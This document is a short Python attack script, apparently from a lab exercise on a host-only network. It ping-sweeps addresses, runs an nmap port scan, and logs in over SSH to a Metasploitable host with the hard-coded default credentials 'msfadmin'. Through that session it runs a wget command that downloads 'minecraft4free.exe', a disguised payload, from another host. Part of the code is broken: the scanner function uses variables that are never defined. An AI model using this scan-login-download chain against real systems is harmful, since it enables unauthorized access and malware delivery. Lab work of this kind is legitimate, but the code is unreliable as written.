import os
import sys
import threading
import nmap
import subprocess
import paramiko
import main
#import netifaces


IpList = []





def nmaper():
    portscan = nmap.PortScanner()
    scannedports = [20,21,22,23,25,53,67,68,69,80,110,443,1337,3389,13337]
    #portnum = 22
    for target in IpList:
        for portnum in (scannedports):
            results = portscan.scan(target, str(portnum))
            results = results['scan'][target]['tcp'][portnum]['state']
            if (results == "open"):
                print(f'{target} port {portnum} is {results}.')

        print("-----------------------------------")
    #once all open ports have been found
        
def ssher():
    command = 'ls'
    command2 = "wget http://192.168.56.101/minecraft4free.exe"
    #command3 = ""
    command = "ls"
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('192.168.56.103', username='msfadmin', password='msfadmin')
    (stdin, stdout, stderr) = client.exec_command(command)
    lines = stdout.readlines()
    print(lines)
    (stdin, stdout, stderr) = client.exec_command(command2)
    lines = stdout.readlines()
    print(lines)
    (stdin, stdout, stderr) = client.exec_command(command)
    lines = stdout.readlines()
    print(lines)

    client.close()

def ping():
    ipbase = "192.168.56."
    for x in range (100,110):
        ip = ipbase + str(x)
        if not os.system('ping -n 1 '+ip+' >'+ip):
            print(ip)
            IpList.append(ip)

    os.system('del '+ip)






























def scanner():  

    while startip != endip:
    
        ip='.'.join(map(str,startip))
        threading.Thread(target=ping,args=(ip,)).start()
        startip[3]+=1
        if startip[3]%256==0:
            startip[3]=0
            if (startip[2]+1)%256==0:
                startip[2]=0
                if (startip[1]+1)%256==0:
                    startip[1]=0
                    if (startip[0]+1)%256==0:
                        startip[0]=0
                    else:
                        startip[0]+=1
                else:
                    startip[1]+=1
            else:
                startip[2]+=1